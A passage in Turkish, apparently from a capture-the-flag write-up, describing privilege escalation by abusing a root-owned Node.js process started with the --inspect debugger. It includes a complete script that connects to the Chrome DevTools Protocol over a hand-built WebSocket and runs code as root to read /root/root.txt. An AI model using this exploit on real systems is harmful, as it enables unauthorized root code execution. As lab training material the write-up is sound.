[ Privilege Escalation ]

Sistemde çalışan processlere bakıyorum:

    ps aux | grep node

İlginç bir satır:

    root 1359 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js

Root olarak çalışan bir Node.js process'i, --inspect flag'i ile başlatılmış.
Bu flag Chrome DevTools Protocol (CDP) inspector'ı açar. 127.0.0.1:9229'da
dinliyor yani dışarıdan erişilemiyor ama bizim zaten local erişimimiz var.

Inspector'ın JSON endpoint'ini sorguluyorum:

    curl -s http://127.0.0.1:9229/json

Çıktı:

    [{
      "id": "086dcfb3-ee5f-4d37-9e72-e509118fd07b",
      "title": "/opt/uptime-monitor/worker.js",
      "webSocketDebuggerUrl": "ws://127.0.0.1:9229/086dcfb3-ee5f-4d37-9e72-e509118fd07b"
    }]

CDP WebSocket üzerinden çalışıyor. Runtime.evaluate komutu ile hedef
process içinde JavaScript çalıştırabiliriz, process root olduğu için
kodumuz da root olarak çalışır.

Problem: hedef sistemde ws modülü yok. Çözüm: Node.js built-in modülleri
olan net ve crypto ile WebSocket protokolünü elle implement ediyorum.

Ayrıca inspector context'inde require() direkt çalışmıyor. Bunun yerine
process.mainModule.require() kullanmak gerekiyor.

/tmp/exploit.js dosyasını yazıyorum:

---
const net = require('net');
const crypto = require('crypto');

const WS_ID = '086dcfb3-ee5f-4d37-9e72-e509118fd07b';
const key = crypto.randomBytes(16).toString('base64');

const handshake = `GET /${WS_ID} HTTP/1.1\r\nHost: 127.0.0.1:9229\r\n` +
  `Upgrade: websocket\r\nConnection: Upgrade\r\n` +
  `Sec-WebSocket-Key: ${key}\r\nSec-WebSocket-Version: 13\r\n\r\n`;

function makeFrame(payload) {
  const data = Buffer.from(payload);
  const mask = crypto.randomBytes(4);
  const masked = Buffer.alloc(data.length);
  for (let i = 0; i < data.length; i++) masked[i] = data[i] ^ mask[i % 4];
  let header;
  if (data.length < 126) {
    header = Buffer.alloc(6);
    header[0] = 0x81; header[1] = 0x80 | data.length;
    mask.copy(header, 2);
  } else {
    header = Buffer.alloc(8);
    header[0] = 0x81; header[1] = 0xfe;
    header.writeUInt16BE(data.length, 2);
    mask.copy(header, 4);
  }
  return Buffer.concat([header, masked]);
}

const client = net.createConnection(9229, '127.0.0.1', () => client.write(handshake));
let upgraded = false, buf = '';

client.on('data', (data) => {
  if (!upgraded) {
    buf += data.toString();
    if (buf.includes('\r\n\r\n')) {
      upgraded = true;
      const cmd = JSON.stringify({
        id: 1,
        method: 'Runtime.evaluate',
        params: {
          expression: "process.mainModule.require('fs').readFileSync('/root/root.txt','utf8')"
        }
      });
      client.write(makeFrame(cmd));
    }
  } else {
    console.log(data.toString());
    client.destroy();
  }
});
